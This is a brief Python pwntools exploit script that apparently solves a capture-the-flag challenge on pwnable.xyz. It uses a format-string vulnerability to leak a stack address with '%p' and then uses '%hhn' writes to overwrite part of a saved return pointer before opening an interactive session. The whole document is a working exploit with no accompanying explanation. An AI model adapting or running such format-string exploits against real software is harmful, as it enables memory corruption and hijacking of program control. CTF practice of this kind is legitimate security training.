from pwn import *

io = remote("svc.pwnable.xyz", 30010)
# io = process("./challenge")

# leak saved_ebp addr
payload = 'A'*0x19 + '%{}$p'.format(0x28/4)

io.sendafter("Name: ", payload)
io.sendlineafter("> ", '2')

ret_at = int(io.recvuntil("1.")[:-2], 16) - 0xC
temp_at = ret_at - 0x200
print "ret_at {}".format(hex(ret_at))
print "temporary mem at {}".format(hex(temp_at))

# write ret, offset 6 to userChoice
payload = 'A'*0x19 + '%{}$hhn'.format(6) # only need to null the last byte of ret
io.sendlineafter("> ", str(u32(p32(temp_at & 0xFFFFFF00 | 1), sign="signed")))
io.sendafter("Name: ", payload)
io.sendlineafter("> ", str(u32(p32(temp_at & 0xFFFFFF00 | 2), sign="signed")))
io.sendlineafter("> ", str(u32(p32(ret_at), sign="signed")))

# option 0 => ret
io.interactive()
